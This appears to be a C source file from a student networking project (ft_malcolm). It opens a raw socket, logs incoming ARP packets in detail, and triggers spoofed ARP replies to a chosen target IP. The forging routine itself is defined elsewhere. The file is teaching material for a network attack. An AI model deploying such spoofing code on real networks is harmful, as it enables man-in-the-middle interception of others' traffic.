/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_arp_bonus.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/02/12 11:19:01 by irifarac          #+#    #+#             */
/*   Updated: 2025/02/12 11:19:03 by irifarac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/ft_malcolm.h"
#include "../Libft/src/libft.h"

static void	ft_arp_section(struct ether_header *recv_eth, struct ether_arp *recv_arp)
{
	struct in_addr	ip_addr;
	struct hostent	*host;
	uint32_t		ip_decimal;

	if (ntohs(recv_eth->ether_type) == ETH_P_ARP)
	{
		printf(TC_YEL "ARP Packet Details:\n" TC_NRM);
		ip_addr.s_addr = *(uint32_t *)recv_arp->arp_spa;
		printf("Sender IP: %s\n", inet_ntoa(ip_addr));
		ip_decimal = ntohl(ip_addr.s_addr);
		printf("Sender IP (Decimal): %u\n", ip_decimal);
		host = gethostbyaddr(&ip_addr, sizeof(ip_addr), AF_INET);
		if (host)
			printf("Sender Hostname: %s\n", host->h_name);
		else
			printf("Sender Hostname: Not found\n");
		ip_addr.s_addr = *(uint32_t *)recv_arp->arp_tpa;
		printf("Target IP: %s\n", inet_ntoa(ip_addr));
		ip_decimal = ntohl(ip_addr.s_addr);
		printf("Target IP (Decimal): %u\n", ip_decimal);
		host = gethostbyaddr(&ip_addr, sizeof(ip_addr), AF_INET);
		if (host)
			printf("Target Hostname: %s\n", host->h_name);
		else
			printf("Target Hostname: Not found\n");
	}
}


static void	ft_print_recv(struct ether_header *recv_eth, struct ether_arp *recv_arp)
{
	printf(TC_GRN"-----------VERBOSE MODE-----------\n" TC_NRM);
	printf(TC_GRN"Received packet\n" TC_NRM);
	printf("Ethernet header: ");
	for (int i = 0; i < (int)sizeof(struct ether_header); i++)
		printf("%02x ", ((unsigned char *)recv_eth)[i]);
	printf("\n");
	printf("Src MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
			recv_eth->ether_shost[0], recv_eth->ether_shost[1],
			recv_eth->ether_shost[2], recv_eth->ether_shost[3],
			recv_eth->ether_shost[4], recv_eth->ether_shost[5]);
	printf("Dst MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
			recv_eth->ether_dhost[0], recv_eth->ether_dhost[1],
			recv_eth->ether_dhost[2], recv_eth->ether_dhost[3],
			recv_eth->ether_dhost[4], recv_eth->ether_dhost[5]);
	printf("EtherType: 0x%04x\n", ntohs(recv_eth->ether_type));
	ft_arp_section(recv_eth, recv_arp);
}

void	ft_arp_bonus(t_info info)
{
	struct sockaddr_ll	device;
	struct ether_header	*recv_eth;
	struct ether_arp	*recv_arp;
	int					sock;
	char				recv_buff[42] = {0};
	char				spa[16] = {0};

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}
	ft_set_device(&info, &device);
	printf("ARP Spoofing Start\n");
	while (!stop)
	{
		ft_recv(sock, recv_buff, sizeof(recv_buff));
		recv_eth = (struct ether_header *)recv_buff;
		recv_arp = (struct ether_arp *)(recv_buff + sizeof(struct ether_header));
		ft_print_recv(recv_eth, recv_arp);
		if (ntohs(recv_eth->ether_type) == ETH_P_ARP &&
				ntohs(recv_arp->ea_hdr.ar_op) == ARPOP_REQUEST)
		{
			printf(TC_GRN"ARP Request received\n"TC_NRM);
			ft_memcpy(spa, inet_ntoa(*(struct in_addr *)&recv_arp->arp_spa), 16);
			if (ft_strncmp(spa, info.ip_target, ft_strlen(info.ip_target)) == 0)
			{
				if (ft_send_arp(info, sock, recv_arp, recv_eth) == -1)
				{
					printf(TC_RED"ARP Spoofing failed\n"TC_NRM);
					break ;
				}
			}
		}
		sleep(1);
	}
	printf(TC_RED "ARP Spoofing is stopped\n" TC_NRM);
	close(sock);
	ft_reset_arp(&info);
}
